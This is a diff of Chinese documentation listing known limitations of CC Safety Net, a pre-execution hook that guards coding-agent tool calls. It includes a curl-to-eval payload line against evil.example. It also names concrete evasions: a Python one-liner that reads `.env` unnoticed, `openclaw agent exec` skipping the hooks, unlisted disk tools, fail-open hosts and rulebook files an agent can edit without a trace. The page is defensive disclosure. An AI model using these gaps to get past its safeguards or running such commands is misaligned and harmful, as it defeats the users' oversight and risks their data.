@@ -1,306 +1,122 @@
 ---
 title: "已知限制和易错点"
 sidebarTitle: "已知限制"
-description: "CC Safety Net 无法捕获的内容：不透明命令代理、二进制文件内部行为、文件系统隔离和网络、符号链接 TOCTOU、解释器标志、解释器注释中的引号、cmd 与嵌套 PowerShell 的读取方式、基于 eval 的执行、Codex 的交互会话缺口和 workdir 缺口、Kimi Code web 与 ACP 会话的工作目录、Windows 上 OpenCode v1 的 workdir、fail-open 的宿主（Grok Build、Factory Droid、Devin CLI）、DeepSeek Harness 的 profile、可选 bundle 与 run_code 缺口、OpenClaw 的会话工作目录与 `openclaw agent exec`，以及 Hermes Agent 和 OpenClaw 的覆盖边界。"
+description: "CC Safety Net 无法捕获的内容：哪些智能体会 fail-open、各自留下哪些覆盖缺口，不透明的命令代理、eval、解析器缺口、PowerShell 与 cmd 的读取方式、敏感路径的覆盖范围、文件系统隔离、网络、符号链接替换，以及智能体可以编辑的规则文件。"
 ---
 
 ## CC Safety Net 无法防护哪些情况？
 
-CC Safety Net 在受支持的工具调用运行前检查它们，但不隔离进程。它没有网络层，因此无法阻止数据经网络外泄。它只保护它能识别的凭证文件和你添加的拒绝路径，所以放在无法识别的文件里的机密仍然可以被读取。它看不到二进制文件内部的行为，绕过已安装集成的命令也完全不会被检查。一次拒绝只会拦下一次工具调用，并不强制文件系统权限。如果要应对数据外泄、不可信代码或需要完整隔离，请同时使用沙箱或操作系统权限。
+CC Safety Net 在受支持的工具调用运行前检查它们。它不隔离进程，也没有网络层，因此无法阻止数据经网络外泄。它保护的是它能识别的凭证文件，以及你添加的拒绝路径。它看不到二进制文件内部的行为，绕过已安装集成的命令也完全不会被检查。如果要应对数据外泄、不可信代码或需要完整隔离，请同时使用[沙箱](/zh-Hans/guides/vs-sandboxing)或操作系统权限。
 
-CC Safety Net 分析智能体尝试运行的命令字符串。它是一个执行前 hook，能阻止已知的破坏性 Git 和文件系统操作，降低意外丢失数据的风险，但不是完整的安全方案。本页列出仍存在的**残余**限制，并说明何时应改用<a href="/zh-Hans/guides/vs-sandboxing">沙箱</a>。
+面对对抗性或动态输入，standard 模式只提供尽力保护。下文有几项属于放宽，[strict 或 paranoid 模式](/zh-Hans/configuration/modes)会将其关闭，本页会在相应位置说明。
 
-产品范围很明确。它是一个尽力而为的静态执行前 hook，只作用于受支持的编码智能体工具调用。它不是操作系统沙箱或权限边界，也无法保护绕过已安装集成的命令。
+<span id="agent-specific-limits"></span>
 
-<Note>Standard 模式对对抗性或动态输入只提供尽力保护，下文有几项属于放宽，<a href="/zh-Hans/configuration/modes">strict 或 paranoid 模式</a>会将其关闭；属于这种情况的条目都会明确说明。</Note>
+## 各智能体的限制
+
+CC Safety Net 自身无法完成分析时，每个集成都会阻止该调用。但 hook 进程崩溃、超时或无法启动，或者插件加载失败时会怎样，由智能体决定。下表根据各智能体的文档或源码，列出截至 2026 年 10 月的行为。“放行该调用”意味着 hook 坏掉后什么也保护不了。
+
+| 智能体 | hook 崩溃或超时时 | 未覆盖的范围 |
+| --- | --- | --- |
+| [Amp Code](/zh-Hans/installation/amp-code#amp-code-coverage-limits) | CC Safety Net 出错时阻止。插件崩溃或未加载时的行为没有文档说明 | CC Safety Net 放行后又被其他插件改写的输入 |
+| [Antigravity CLI](/zh-Hans/installation/antigravity-cli#what-the-antigravity-cli-hook-checks) | 阻止该调用 | 只有 `run_command` 和 `manage_task` 的 `send_input` 会按命令分析 |
+| [Claude Code](/zh-Hans/installation/claude-code#when-claude-code-asks-you-instead-of-blocking) | 放行该调用（fail-open） | 在 `standard` 下，两种无法验证的拒绝会改为批准提示 |
+| [Codex](/zh-Hans/installation/codex#codex-coverage-limits) | 放行该调用（fail-open） | 在运行中的会话里输入的文本，以及调用的 `workdir` |
+| [Cursor](/zh-Hans/installation/cursor#what-the-cursor-hook-checks) | 阻止该调用（`failClosed: true`） | 只有 `Shell` 调用会按命令分析 |
+| [DeepSeek Harness](/zh-Hans/installation/deepseek-harness#deepseek-harness-coverage-limits) | 防护出错时阻止。bundle 加载失败时，该 profile 不受检查 | `web` 和 `desktop` 以外的 profile、PTC 模式下的 `run_code`、`terminal_send` |
+| [Devin CLI](/zh-Hans/installation/devin-cli#devin-cli-coverage-limits) | 放行该调用（fail-open） | 项目 `.devin/hooks.v1.json` 中的 hook、拆分到多次 `write_to_process` 调用中的命令、Devin Cloud |
+| [Factory Droid](/zh-Hans/installation/factory-droid#factory-droid-coverage-limits) | 放行该调用（fail-open） | `allowManagedHooksOnly` 开启期间的一切。`Task`、`Loop` 和自动化工具未经验证 |
+| [Gemini CLI](/zh-Hans/installation/gemini-cli) | 崩溃、超时或输出无效时放行该调用。缺少 `npx` 或 `node` 时阻止 | 没有记录在案的智能体特有缺口 |
+| [GitHub Copilot CLI](/zh-Hans/installation/github-copilot-cli) | 崩溃或 hook 无法启动时阻止。超时或输出无效时放行该调用 | 没有记录在案的智能体特有缺口 |
+| [Grok Build](/zh-Hans/installation/grok-build#what-the-grok-build-hook-checks) | 放行该调用（fail-open） | hook 失败且没有任何输出时，调用会照常运行 |
+| [Hermes Agent](/zh-Hans/installation/hermes-agent#hermes-agent-coverage-limits) | 阻止该调用 | `terminal`、`read_file`、`write_file` 和 `patch` 以外的工具、`!command` 输入、Windows |
+| [Kimi Code](/zh-Hans/installation/kimi-code#kimi-code-coverage-limits) | 放行该调用（fail-open） | `kimi web` 和 ACP 会话中的会话目录 |
+| [OpenClaw](/zh-Hans/installation/openclaw#openclaw-coverage-limits) | 出错时阻止。插件加载失败时，`exec` 不受检查 | 文件工具和 `apply_patch`、工作区之外的会话目录、`openclaw agent exec`、Windows |
+| [OpenCode](/zh-Hans/installation/opencode#opencode-coverage-limits) | 出错时阻止。插件加载失败时，工具不受检查 | OpenCode 1.x 在 Windows 上以 POSIX 根路径表示的 `workdir` |
+| [Pi](/zh-Hans/installation/pi#what-the-pi-extension-checks) | 出错时阻止。`/reload` 期间加载失败时，Pi 不受检查 | 名为 `Shell` 的自定义命令工具 |
 
 ## 命令分析限制
 
 ### 二进制文件内部行为
 
-如果命令本身看不出破坏性操作，命令字符串分析就无法推断出来。`some-tool --task destructive-cleanup` 在 CC Safety Net 看来是无害的，因为它无法检查任意二进制文件在运行时做了什么。这类威胁请改用<a href="/zh-Hans/guides/vs-sandboxing">沙箱</a>。
+命令分析只能看到命令文本。`some-tool --task destructive-cleanup` 看起来是无害的，因为 CC Safety Net 无法检查任意二进制文件在运行时做了什么。这类威胁请改用[沙箱](/zh-Hans/guides/vs-sandboxing)。
 
 ### 未配置或不透明的命令代理
 
-代你运行 shell 命令的工具（例如 `rtk git reset --hard`），声明为透明包装器后就会被分析：
-
-```bash
-npx -y cc-safety-net rule wrapper add rtk
-```
-
-配置之后，分析会穿过包装器看到可见的子命令，因此内置规则和<a href="/zh-Hans/configuration/custom-rules">自定义规则</a>对 `rtk git reset --hard` 的处理与对 `git reset --hard` 完全一致。有八个命令不需要这样声明，因为它们总会执行一个可见的子命令：`caffeinate`、`exec`、`nice`、`nohup`、`setsid`、`stdbuf`、`time`、`timeout`。其余包装器中，只配置你信任的那些。保留命令（`git`、`busybox`、内置分析命令、shell 包装器和解释器）不能注册为包装器。
-
-这项限制只影响以下两类代理：
-
-- 既不属于这八个，也不在 `transparent_wrappers` 中的代理不会展开。
-- 即使已配置，改写或隐藏子命令而不是执行可见子命令的代理也无法展开。
-
-这两种情况下，只有顶层危险文本 fallback 扫描可能捕获命令，而该扫描并不完整。`transparent_wrappers` 位于 `rule.json` 中，因此某个范围的 `rule.json` 无法读取时，在修复之前该范围声明的包装器都会失效；内置的这八个不受影响。见<a href="/zh-Hans/configuration/recovery">配置恢复</a>。
+代你运行命令的工具（例如 `rtk git reset --hard`），只有在你把它声明为[透明包装器](/zh-Hans/configuration/custom-rules#transparent-wrappers)之后才会被分析。改写或隐藏子命令的代理，即使声明了也无法展开。这两种情况下，只有一项并不完整的 回退文本扫描可能捕获该命令。
 
 ### 插件的 shell 工具在声明之前不被分析
 
-CC Safety Net 只对精确匹配的工具名按命令执行处理。它认识每个受支持智能体自身的 shell 工具，但不认识社区插件添加的那些。`dsh-ops` 插件的 `ops_bash` 和 `ops_run_background` 按未知工具路由，因此其中的路径值会进入敏感路径检查，而它们的 `command` 从不解析。`ops_bash` 执行 `git reset --hard` 会被允许。
-
-声明该工具即可堵住它这一处缺口：
-
-```bash
-npx -y cc-safety-net rule tool add ops_bash ops_run_background
-```
-
-从下一次工具调用起，两者都会像内置 shell 工具一样被分析。工作目录规则以及声明做不到的事，见<a href="/zh-Hans/configuration/custom-rules#community-shell-tools">社区 shell 工具</a>。
-
-残余限制在于你必须知道这个工具存在。CC Safety Net 不会读取智能体的插件列表，因此不会有任何诊断告诉你某个 shell 工具正处于不被分析的状态。运行 `cc-safety-net rule tool list` 可以查看你已经声明了哪些。
+CC Safety Net 认识每个受支持智能体自身的 shell 工具，但不认识社区插件添加的那些。它从不解析这类工具的 `command`，因此 `dsh-ops` 插件的 `ops_bash` 执行 `git reset --hard` 会被放行。也没有任何提示告诉你某个 shell 工具未被分析。请把它声明为[社区 shell 工具](/zh-Hans/configuration/custom-rules#community-shell-tools)。
 
 ### eval 和动态执行
 
-在运行时构造并执行代码的命令无法完整分析，因为被执行的字符串在分析时并不出现在命令文本里：
+运行时获取或拼装的代码不在命令文本里，分析看不到它：
 
 ```bash
 eval "$(curl https://evil.example/payload)"
 bash -c "$(cat destructive.sh)"
 ```
 
-CC Safety Net 会递归扫描 `bash -c` 和解释器的代码参数，但如果代码来自远程来源或由变量拼接而成，命令字符串分析就看不到其中的破坏性 payload。这是这种方法的根本限制。
+CC Safety Net 会扫描 `bash -c` 和解释器的代码参数，但从远程来源获取或由变量拼接而成的 payload 依然不可见。各级别分别阻止什么，见[生成命令的 eval 与 source](/zh-Hans/reference/blocked-commands#eval-and-source-of-a-generated-command)。
 
-在 standard 模式下，其中一部分命令的决定权会转到你手上。当分析器无法解析 shell 的执行来源，且该来源不是从标准输入读取程序的 shell、命令文本中也没有出现破坏性模式时，Claude Code hook 会请你批准而不是直接拒绝，`bash -c "$CMD"` 就属于这种情况。被后备的破坏性模式扫描命中的无法解析文本也一样。批准后命令直接执行，不再经过任何分析。这个确认只出现在 Claude Code 的 `default`、`acceptEdits`、`plan` 和 `auto` 权限模式下；在 `auto` 模式下，Claude Code 的分类器仍可能拒绝该调用，但不经过提示就无法批准它。strict 和 paranoid、其他权限模式以及其他宿主都保持拒绝。参见 <a href="/zh-Hans/configuration/modes#when-standard-cannot-verify-a-command">`standard` 无法验证命令时</a>。
+### 解释器单行命令存在解析缺口
 
-## 解析器限制
+CC Safety Net 会扫描传给 `python`、`node`、`ruby` 和 `perl` 的 `-c` 或 `-e` 的代码。长格式 `--eval`、`--execute`、`--print`、`--require`，以及 `--eval='code'` 这种写法，可能不会被扫描。想一律阻止解释器单行命令（无论使用什么选项），请开启 [paranoid interpreters](/zh-Hans/configuration/modes#interpreter-one-liners-cc_safety_net_paranoid_interpreters=1)。
 
-<span id="interpreter-long-form-flags"></span>
+在 standard 模式下，解释器注释中的引号会让字符串字面量的起始位置发生偏移，注释中的 Python `"""` 也可能把对机密文件的读取藏起来。[strict 模式](/zh-Hans/configuration/modes#strict-mode-cc_safety_net_strict=1)不受影响。
 
-### 解释器长格式标志
+### PowerShell 只按子集读取
 
-CC Safety Net 提取传给解释器 `-c` 或 `-e` 标志的代码（适用于 `python`、`python2`、`python3`、`node`、`ruby`、`perl`），并扫描其中是否有内嵌的破坏性操作。**对应的长格式**（`--eval`、`--execute`、`--print`、`--require`）和附加的 `=value` 形式（`--eval='code'`）并非在所有代码路径中都能识别。使用长格式时，代码参数可能不会被提取出来做递归分析。
-
-如果你担心自己的环境中出现解释器绕过，请启用 <a href="/zh-Hans/configuration/modes#paranoid-interpreters">paranoid interpreters 模式</a>（`CC_SAFETY_NET_PARANOID_INTERPRETERS=1`），它会一律阻止所有解释器单行命令，不论内容如何。
-
-### 解释器注释中的引号
-
-机密保护会先把解释器内联代码中的字符串字面量涂白，再把剩下的部分按代码扫描。这一步是词法层面的，不会跳过注释，因此注释里的引号会与代码中后面的引号配成一对，使字面量的起止位置发生偏移。Ruby 或 Perl 注释里的英文缩写（`# it's the config`）会留下一个撇号，等着后面的撇号来闭合；含 `"""` 的 Python 注释则会开启一个三引号字符串。
-
-单引号或双引号的字面量到行尾仍未闭合时，这一步会中止，整段代码回退到保留全部带引号 token 和类路径 token 的扫描。多数错配都止步于此。注释里开启的 Python 三引号没有这样的停止点，因此可能让一次读取躲过 standard 模式。<a href="/zh-Hans/configuration/modes#strict-mode">strict 模式</a>不受影响，因为它同时会扫描字面量文本内部。
-
-### 短选项附加值
-
-捆绑短标志（例如 `-rf`）会正确拆为 `{ -r, -f }`。但不同分析器对短选项的**附加值形式**（例如 `-Cfoo`，其中 `foo` 是 `-C` 的值）处理不一致。阻止 `-f` 等标志时，如果它实际是 `-Cfoo` 等附加选项值的一部分，可能产生误报。
-
-这一点在编写精确的<a href="/zh-Hans/configuration/custom-rules">自定义规则</a>时最需要注意。如有疑问，请使用 <a href="/zh-Hans/configuration/modes#strict-mode">strict</a> 或 <a href="/zh-Hans/configuration/modes#paranoid-mode">paranoid</a> 模式以获得更强的保护。
-
-<span id="symlink-toctou-risk"></span>
-
-### 符号链接 TOCTOU 风险
-
-`rm -rf` 目标分类会先把符号链接解析到规范目标，再判定路径是否危险。分析器解析路径与 shell 实际执行 `rm` 之间存在不可避免的**检查时间到使用时间（TOCTOU）**窗口。符号链接可能在此窗口内重新指向其他位置。
-
-所有执行前命令分析工具都有这一固有限制。要彻底消除它，就得在内核中运行或拦截系统调用，这超出了 hook 的范围。<a href="/zh-Hans/configuration/modes#paranoid-rm-check">paranoid rm</a> 模式（`CC_SAFETY_NET_PARANOID_RM=1`）可为希望更激进地拦截的运维人员提供更严格的策略。
+CC Safety Net 读取的是 PowerShell 的一个保守子集，而不是完整语言。在 `posix` shell 模式下，`Remove-Item` 规则只在嵌套的 `powershell` 或 `pwsh` `-Command` 脚本中生效。在 `auto` 模式下，`ForEach-Object` 和 `Where-Object` 会切换到 PowerShell 读取器，但它们的别名 `%` 和 `?` 不会。见 [PowerShell 命令](/zh-Hans/reference/blocked-commands#powershell-commands)。
 
 <span id="windows-command-prompt-and-nested-powershell"></span>
 
-### Windows 命令提示符与嵌套的 PowerShell
+### Windows 命令提示符与嵌套 PowerShell
 
-CC Safety Net 用有界的文本检查读取 `cmd /c` 或 `cmd /k` 的正文，而不是 cmd 解析器。这项检查会在正文拆出的每一段里任意位置查找删除词，因此可能阻止实际上不删除任何内容的命令。`cmd /c 'echo rmdir /s /q C:\'` 会被当作删除驱动器根目录而阻止。它不会打开正文运行的批处理文件，也不会求值延迟展开（`!VAR!`），所以文件里的删除和运行时才拼出的删除都看不到。
+CC Safety Net 用文本检查读取 `cmd /c` 或 `cmd /k` 的命令体，而不是用 cmd 解析器。因此它可能阻止一条什么都不删除的命令，例如 `cmd /c 'echo rmdir /s /q C:\'`。它不会打开命令体运行的批处理文件，也不会对延迟扩展（`!VAR!`）求值。
 
-嵌套的 `powershell` 或 `pwsh` 只有在[嵌套的 PowerShell 脚本](/zh-Hans/reference/blocked-commands#nested-powershell-scripts)所述的形态下才会被读取。用 `-File` 运行或从标准输入读取的脚本不会被读取，因此无论文件做什么，`pwsh -File cleanup.ps1` 都会被允许。未读取的形式只有在其自身文本同时包含删除命令和递归开关时才会被阻止。
+对嵌套的 `powershell` 或 `pwsh`，CC Safety Net 只读取[嵌套的 PowerShell 脚本](/zh-Hans/reference/blocked-commands#nested-powershell-scripts)中描述的那种形式。用 `-File` 运行或从 stdin 读取的脚本不会被读取，因此无论文件内容是什么，`pwsh -File cleanup.ps1` 都会被放行。
 
-## 范围外保护
+<span id="out-of-scope-protections"></span>
 
-下列边界不属于 CC Safety Net 的覆盖目标。它们大多需要**隔离**而不是语义分析，属于另一个保护层。每一项对应的沙箱能力见 <a href="/zh-Hans/guides/vs-sandboxing#where-cc-safety-net-cannot-help">CC Safety Net 无法提供帮助的范围</a>。
+## 超出范围的防护
 
-### 敏感路径覆盖有界，不是通用读取边界
+以下限制需要靠隔离而不是命令分析来解决，[沙箱](/zh-Hans/guides/vs-sandboxing)能覆盖其中大部分。
 
-CC Safety Net **确实**保护敏感路径。对<a href="/zh-Hans/reference/secret-protection">内置敏感集合</a>的读取会被阻止，这一集合包括 `.env` 及其变体、`~/.ssh/id_*`、`~/.aws`、`~/.kube/config`、编码 CLI 凭证存储等。用户配置的拒绝路径及其下的所有路径也会被阻止。保护覆盖受支持的 command、path、search 和 patch 形式，包括未知工具的 fallback 检查。
+### 敏感路径的覆盖范围有限
 
-编码 CLI 覆盖分两层。**Credential** 层（身份验证令牌和凭证存储）默认启用。**Config** 层（settings 和 MCP 配置文件，智能体会在日常工作中编辑）默认关闭，需要在 `secret_protection.overrides` 中显式设置 `"on"`。Antigravity 唯一的规则（`secret.cli.antigravity`）位于需要主动开启的 config 层，因此它没有默认启用的 credential 规则。完整层级和各规则保护路径见<a href="/zh-Hans/reference/secret-protection#coding-cli-credential-tier-on-by-default">机密保护参考</a>。
+[机密保护](/zh-Hans/reference/secret-protection)阻止读取一组固定的凭证文件，以及你添加的拒绝路径。它不是通用的读取边界：
 
-残余限制在于，它是**针对受支持形式的有界模式集**，而不是通用的读取边界：
+- 文件名和扩展名都不在列表中的文件，CC Safety Net 识别不出其中的凭证。
+- standard 模式允许 `test -f .env` 这类只查元数据的检查，以及一些它视为“提及”而非读取的形式。见 [standard 模式不算作读取的情形](/zh-Hans/reference/secret-protection#what-standard-mode-does-not-count-as-a-read)。strict 和 paranoid 会阻止这些形式。
+- standard 模式不会从文件名追踪到后续的读取，因此 `python3 -c "for f in {'.env'}: print(open(f).read())"` 会被放行。strict 会阻止它。
+- `policy.json` 中的 `secret_protection.enabled: false` 会关闭整个阶段，拒绝路径也一并失效。
 
-- 凭证所在文件的名称和扩展名不在模式列表中时，不会被识别。
-- Standard 模式允许对内置敏感路径做仅元数据检查，例如 `test -f ~/.ssh/id_rsa`、`find ~/.ssh -type f`、`ls -la ~/.ssh`、`stat .env`、`wc -l .env` 或 `grep -l KEY .env`；这类检查既可以单独出现，也可以像 `test -f .env && echo present` 那样只占复合命令中的一段。对内置的文件名规则，一些形式也被当作提及而不是读取，例如：对应已存在目录的机密文件名；由重定向、`mkdir` 或 `touch` 新建的文件；位于数据位置的 Python 或 JavaScript 字符串字面量。这些形式都不适用于 `secret.home.*` 和 `secret.cli.*` 规则。<a href="/zh-Hans/configuration/modes#strict-mode">Strict 和 paranoid</a> 会阻止这里列出的全部形式。任何模式都不会放宽配置的拒绝路径。准确条件见 <a href="/zh-Hans/reference/secret-protection#what-standard-mode-does-not-count-as-a-read">standard 模式不算作读取的情形</a>。
-- Standard 模式不会把名称追踪到后续的读取。放在容器中的字符串字面量，即使代码随后打开它，也仍按数据处理，所以 `python3 -c "for f in {'.env'}: print(open(f).read())"` 会被允许。`for` 循环把循环变量写入文件、再由后续命令读回时，同样不会被追踪。Strict 模式会阻止这两种情况。
-- 在 `policy.json` 中把 `secret_protection.enabled` 设置为 `false` 会关闭整个阶段，包括拒绝路径。
+### 没有完整的文件系统隔离
 
-如果需要限制*所有*读取而不是已识别集合，请使用<a href="/zh-Hans/guides/vs-sandboxing#where-cc-safety-net-cannot-help">沙箱</a>。
+一次拒绝只拦下一次工具调用，并不强制文件系统权限。灾难性规则始终生效，但要获得完整保护，请使用操作系统权限、沙箱或写入代理（write broker）。
 
-### 不提供完整文件系统隔离
+<span id="disk-tool-coverage-is-a-named-list"></span>
 
-CC Safety Net 在工具调用运行前拒绝它，但不会强制执行文件系统权限。阻止消息是给智能体的指导，并不等于对文件系统的完整强制执行。灾难性保护始终强制执行，包括递归删除根目录或主目录、受保护的 Git 元数据集合和两个范围的 `policy.json`；但当你需要完整保护而不是尽力拦截时，请使用可信写入代理、操作系统权限、沙箱或同等的运行时强制执行机制。
+### 磁盘工具的覆盖是一份具名列表
 
-### 磁盘工具的覆盖范围是一份明确清单
+磁盘规则匹配的是具名命令。CC Safety Net 不分析 `fdisk`、`sfdisk`、`gdisk`、`mkswap`、`blkdiscard` 以及 `diskutil apfs` 的子命令，因此 `fdisk /dev/sda` 会被放行。通过 `dd` 以外的任何方式写入设备同样不在覆盖范围内，所以 `tee /dev/sda` 和 `cp img.raw /dev/sda` 都会运行。重定向规则只读取字面目标，因此 `echo x > $DEV` 会被放行。请为团队使用的工具添加[自定义规则](/zh-Hans/configuration/custom-rules)。
 
-磁盘破坏规则只匹配列出的命令头和子命令，并不涵盖覆写设备的所有方式。`fdisk`、`sfdisk`、`gdisk`、`mkswap` 和 `blkdiscard` 都不在分析范围内，`diskutil apfs` 的子命令也一样，因此 `fdisk /dev/sda` 和 `diskutil apfs deleteContainer disk4` 都被允许。用 `dd` 之外的命令写入设备同样不在覆盖范围内，`tee /dev/sda` 和 `cp img.raw /dev/sda` 都能运行。重定向规则只读取字面目标，所以无论 `DEV` 取什么值，`echo x > $DEV` 都被允许。如需覆盖团队用到的工具，请添加[自定义规则](/zh-Hans/configuration/custom-rules)。
+<span id="no-network-layer"></span>
 
 ### 没有网络层
 
-运行时评估不发出网络请求，防护管线也不检查或过滤出站流量。通过网络外泄数据、域名允许列表和容器边界都不在产品范围内，而这些正是沙箱的网络限制所要解决的问题。
+CC Safety Net 检查调用时不发出任何网络请求，也不过滤流量。数据外泄、域名允许列表、由提示注入引发的外泄以及容器边界都不在它的范围内。沙箱的网络限制可以覆盖这些。
 
-### 通用攻击防护
+### 符号链接 TOCTOU 风险
 
-阻止提示注入驱动的数据外泄、验证用户身份和强制容器边界都不在范围内。CC Safety Net 假定智能体的命令字符串不可信，但不会检测任意二进制文件内部的隐藏行为。
+CC Safety Net 在判断 `rm -rf` 目标时会解析符号链接，而 shell 在此之后才运行 `rm`。如果符号链接在这期间被改指向别处，CC Safety Net 无法察觉。任何执行前 hook 都无法弥补这个缺口。想采取更严格的立场，[paranoid rm](/zh-Hans/configuration/modes#rm-check-cc_safety_net_paranoid_rm=1) 会阻止更多递归删除。
 
 ### 自定义规则配置不防篡改
 
-防篡改覆盖两个范围的 `policy.json`：用户策略文件，以及分别从执行目录和配置目录解析出的项目策略文件。`rule.json` 和 rulebook 不在保护范围内。每个 rulebook 都是运行时在每次工具调用时重新读取的实时文件，因此能写入 rules 目录的智能体，从下一次调用起就能改变实际生效的内容。
+只有 `policy.json` 受到保护，智能体无法改动。`rule.json` 和 rulebook 都是普通文件，运行时在每次工具调用时重新读取，因此能写入规则目录的智能体，可以改变下一次调用时执行的内容。对落盘的 `rulebook.json` 所做的编辑不会留下任何记录，并且一直生效，直到下一次 `rule update` 将其覆盖。
 
-从 `rule.json` 中删除来源条目不再是唯一无人拦截的改动。`rule update` 往已落盘的 `rulebook.json` 里写了什么，没有任何地方记录，因此改写该文件中某条规则的 `match` 或 `reason`，不会留下改动痕迹。加载时，运行时只校验文件是否符合 schema，以及 `name` 是否与来源一致，然后照单执行。这处改动会一直生效，直到下一次 `rule update` 覆盖该文件。是否保护 `rule.json` 是一项推迟的产品决策。
+## 破坏性命令漏网后怎么办
 
-项目的 `policy.json` 有一处有意设下的边界。它受保护的目录链止于自身的 `.cc-safety-net` 目录，而用户策略文件的目录链覆盖其所在目录以及直到文件系统根目录的每一级上级目录。项目这一侧若继续向上，就会把项目目录及其所有上级目录都纳入保护。那些正是破坏性命令规则针对的路径，而策略保护先于它们运行，于是 `rm -rf .` 和 `find . -delete` 会返回这道防护的通用原因，而不是它们本来的原因。
-
-<span id="hermes-agent-and-openclaw-coverage-boundaries"></span>
-
-## Hermes Agent 和 OpenClaw 覆盖边界
-
-Hermes Agent 和 OpenClaw 集成只覆盖一组明确定义的工具和执行主机。这个集合之外的调用要么得不到判定，要么直接被阻止。下面列出这些边界。
-
-### Hermes Agent 只检查固定工具列表
-
-托管 Hermes 插件只注册一个 `pre_tool_call` hook，并且只把四个工具转交分析：`patch`、`read_file`、`terminal` 和 `write_file`。调用其他 Hermes 工具不会转发，也不会得到任何判定。
-
-你自己输入的 `!command` 同样在范围外。bang-shell 输入不会触发 `pre_tool_call`，而是交给 Hermes 自己的命令防护处理。CC Safety Net 只能看到模型生成的工具调用，看不到 Hermes 启动的每一个子进程。如果 Hermes 根本没有加载插件，就不会有任何阻止。只有 `npx cc-safety-net doctor` 会报告插件已存在但未启用。
-
-### OpenClaw 覆盖本地 Gateway 主机上的 exec
-
-OpenClaw 插件只为规范的 `exec` 工具注册 `before_tool_call`。`apply_patch` 以及 OpenClaw 的读取、写入、编辑文件工具都不受保护。带 `toolKind` 区分标记的 `exec` 事件同样得不到判定。这样就排除了与 `exec` 同名的其他工具，例如 Code Mode 的 JavaScript `exec`。它的 `command` 字段并未被证明能映射为 shell 命令。
-
-执行主机分三种情况：
-
-- 没有 `host`、`host: "auto"` 或 `host: "gateway"` 的 `exec` 调用会按本地 Gateway 调用分析，路径按智能体 workspace 解析。
-- 显式指定 `host: "sandbox"` 或 `host: "node"` 的调用不会被分析，而是作为不受支持的形式直接阻止，因为没有测试能证明这些主机的路径映射是正确的。
-- 配置中的 `tools.exec.host` 默认值不会改变分析：插件只读取调用自身的 `host` 参数，因此即使默认值把调用路由到 `node` 或 `sandbox`，没有 `host` 的调用仍按本地 Gateway 调用分析。
-
-残余缺口之一出在 `auto` 上：sandbox runtime 处于活动状态时，`auto` 调用在沙箱文件系统中运行，而路径规则仍然按 Gateway workspace 判定。命令规则不受影响；路径规则则可能针对错误的文件系统判定。
-
-另一处残余缺口是执行目录。OpenClaw 在会话的工作目录中运行 `exec`，而这个目录未必就是智能体 workspace。使用托管 worktree 的会话在自己的 checkout 中运行，默认位于 `<state>/worktrees` 下；创建时指定了 `cwd` 的会话则在该目录中运行。`before_tool_call` 的 hook 上下文不带工作目录，因此插件始终以智能体 workspace 作为每次 `exec` 调用的基准目录。当会话目录与 workspace 不同时：
-
-- 没有 `workdir` 的命令按 workspace 分析，实际却在会话目录中运行。
-- 相对路径的 `workdir` 按 workspace 解析，而不是按会话目录。
-- 指向 workspace 之外的绝对 `workdir`（例如会话自己的 worktree）会被阻止。
-
-要填补这个缺口，需要宿主暴露执行目录。
-
-有一个 OpenClaw 命令会完全绕过 hook。`openclaw agent exec` 从不加载插件的 hook 注册表，因此不会运行任何 `before_tool_call` hook；即使插件已经安装并加载，它的工具调用也既不经过分析，也不留审计记录。同样的工具调用改由 `openclaw agent --local` 发出时会被阻止。
-
-Codex-native relay 未经测试，因此不作任何保证：端到端实测驱动的是 OpenClaw 自己的智能体 runtime，无法证明 Codex-native 的 shell、patch 或 MCP 调用会如何处理。
-
-### 两种集成都不支持 Windows
-
-两种集成都假定 POSIX 状态布局。Hermes 的根目录取自 `HERMES_HOME`，未设置时为 `~/.hermes`；根目录下的 `active_profile` 文件再选出 `<root>/profiles/<name>`，该文件缺失、为空或内容是 `default` 时则保持根目录。如果 `HERMES_HOME` 本身就指向 `profiles` 下的目录，则原样使用。OpenClaw 的主目录取自 `OPENCLAW_HOME`，未设置时为操作系统的主目录；状态目录依次取 `OPENCLAW_STATE_DIR`、`OPENCLAW_CONFIG_PATH` 所在目录、`<home>/.openclaw`。详见 [Hermes Agent](/zh-Hans/installation#hermes-agent-installation) 和 [OpenClaw](/zh-Hans/installation#openclaw-installation) 的安装步骤。Windows 的默认位置则不在此列：安装和检测在 Windows 上仍指向 POSIX 路径，因此 Hermes 安装会把插件写入 Hermes 不会读取的目录；OpenClaw 自己的 CLI 可以正确安装，但 `doctor` 会误报状态。
-
-<span id="deepseek-harness-coverage-boundaries"></span>
-
-## DeepSeek Harness 覆盖边界
-
-CC Safety Net 在 DeepSeek Harness 中是 profile 的一个可选插件 bundle，它的 guard 只能拒绝。宿主的若干部分不在它的覆盖范围内。
-
-<span id="install-covers-the-web-and-desktop-profiles-only"></span>
-
-### 安装只覆盖 web 和 desktop profile
-
-`install --deepseek-harness` 只把插件添加到 `web` 和 `desktop` 两个 profile。`acp`、`headless`、`sdk`、`sdk-minimal` profile 以及之后新建的 profile 都在没有 CC Safety Net 的状态下运行，直到你用 `dsh plugin --profile <name> add cc-safety-net` 为它们添加插件。
-
-### 可选 bundle 加载失败只会警告
-
-DeepSeek Harness 把可选插件的 import 或 `apply()` 失败当作警告并继续运行，因此 bundle 没有加载成功的 profile 会在无保护的状态下运行。`doctor` 读的是磁盘上的 profile manifest，不是运行中的宿主，所以仍会把该 profile 报告为已配置。桌面应用还有另一种情况：它的崩溃恢复操作会禁用第三方 bundle，直到你在 Plugins 页面重新启用它们。
-
-### PTC 模式下的 run_code 不做分析
-
-PTC 模式默认关闭。启用后，`run_code` 工具会执行模型写出的 TypeScript，这段代码可以直接调用 Node.js API。只有这段代码发出的工具子调用才会到达 guard，所以它通过 `node:fs` 做的文件写入得不到判定。
-
-### terminal_send 的文本未经分析就进入 shell
-
-选择启用的终端类工具会把 `terminal_send` 的文本不经分析直接写进常驻 shell。常驻的 `bash` 或 `pwsh` 工具每次调用都会分析，但它跨调用保留目录变更，而 CC Safety Net 按会话工作区评估每次调用，两者可能逐渐不一致。
-
-### Windows 上桌面应用的路径未经测试
-
-在 Windows 上，CC Safety Net 在 `%LOCALAPPDATA%\Programs\DeepSeek Harness\resources\runtime\cli\bin\dsh.cmd` 查找桌面应用，并读取 `%APPDATA%\@deepseek-ai\dsh-desktop\lockfile` 判断它是否正在运行。没有任何测试针对真实的 Windows 桌面应用验证过这两个路径。web profile 不受影响，Linux 上则完全不会去查找桌面应用。详见 [DeepSeek Harness 安装](/zh-Hans/installation#deepseek-harness-installation)。
-
-<span id="codex-coverage-boundary"></span>
-
